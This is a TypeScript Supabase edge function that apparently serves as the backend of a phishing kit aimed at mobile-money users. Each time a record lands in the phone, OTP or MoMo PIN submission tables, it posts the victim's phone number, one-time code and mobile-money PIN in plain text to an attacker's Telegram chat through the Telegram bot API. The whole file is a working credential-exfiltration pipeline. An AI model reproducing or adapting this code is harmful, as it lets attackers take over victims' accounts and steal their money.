import "jsr:@supabase/functions-js/edge-runtime.d.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Client-Info, Apikey",
};

interface WebhookPayload {
  type: string;
  table: string;
  record: {
    id: string;
    phone_number: string;
    otp_code?: string;
    momo_pin?: string;
    privacy_agreed?: boolean;
    created_at: string;
  };
  schema: string;
  old_record: null;
}

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") {
    return new Response(null, {
      status: 200,
      headers: corsHeaders,
    });
  }

  try {
    const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
    const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID");

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error("Missing Telegram credentials");
      return new Response(
        JSON.stringify({ error: "Missing Telegram configuration" }),
        {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    const payload: WebhookPayload = await req.json();
    const { table, record } = payload;

    let message = "";
    const timestamp = new Date(record.created_at).toLocaleString("en-US", {
      timeZone: "UTC",
      dateStyle: "medium",
      timeStyle: "short",
    });

    if (table === "phone_submissions") {
      message = `🔔 <b>New Phone Submission</b>\n\n` +
        `📱 <b>Phone:</b> ${record.phone_number}\n` +
        `✅ <b>Privacy Agreed:</b> ${record.privacy_agreed ? "Yes" : "No"}\n` +
        `🕐 <b>Time:</b> ${timestamp}`;
    } else if (table === "otp_submissions") {
      message = `🔔 <b>New OTP Submission</b>\n\n` +
        `📱 <b>Phone:</b> ${record.phone_number}\n` +
        `🔐 <b>OTP Code:</b> <code>${record.otp_code}</code>\n` +
        `🕐 <b>Time:</b> ${timestamp}`;
    } else if (table === "momo_pin_submissions") {
      message = `🔔 <b>New MoMo PIN Submission</b>\n\n` +
        `📱 <b>Phone:</b> ${record.phone_number}\n` +
        `🔑 <b>MoMo PIN:</b> <code>${record.momo_pin}</code>\n` +
        `🕐 <b>Time:</b> ${timestamp}`;
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    if (!telegramResponse.ok) {
      const error = await telegramResponse.text();
      console.error("Telegram API error:", error);
      throw new Error(`Telegram API error: ${error}`);
    }

    return new Response(
      JSON.stringify({ success: true, message: "Notification sent" }),
      {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  }
});